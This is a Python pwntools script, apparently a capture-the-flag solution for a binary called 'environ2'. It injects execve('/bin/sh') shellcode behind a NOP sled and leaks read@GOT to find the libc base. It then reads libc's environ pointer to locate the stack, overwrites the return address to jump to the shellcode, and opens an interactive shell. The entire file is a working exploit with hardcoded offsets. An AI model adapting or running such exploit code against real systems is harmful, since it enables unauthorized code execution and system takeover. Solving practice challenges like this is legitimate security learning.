#!/usr/bin/python 
from pwn import *

context.arch = 'x86_64'
context.log_level = 'debug'
p = process("./environ2")
elf = ELF("./environ2")
libc = elf.libc
buf_ptr = elf.symbols['buf_ptr']
read_got = elf.got['read']

#gdb.attach(p)
p.send('\x90'*100 + asm(shellcraft.execve('/bin/sh')))

p.sendlineafter("Addr: ", str(buf_ptr))
p.sendlineafter("Value: ", str(read_got))

p.recvuntil("buf: ")
read = u64(p.recvuntil('\x7f') + '\x00\x00')
log.info("read : "+hex(read))
libcBase = read - 0xf7250
log.info("libcBase: "+hex(libcBase))
libc_environ = libcBase + 0x3c6f38

p.sendlineafter("Addr: ", str(buf_ptr))
p.sendlineafter("Value: ", str(libc_environ))

p.recvuntil("buf: ")
stack_environ = u64(p.recvuntil("\x7f") + '\x00\x00')
log.info("stack_environ : "+hex(stack_environ))
ret = stack_environ - 0xf0
log.info("ret : "+hex(ret))
stack_shellcode = ret - 0x3e8

for i in range(8):
    p.sendlineafter("Addr: ", str(ret))
    p.sendlineafter("Value: ", str(stack_shellcode))

p.interactive()
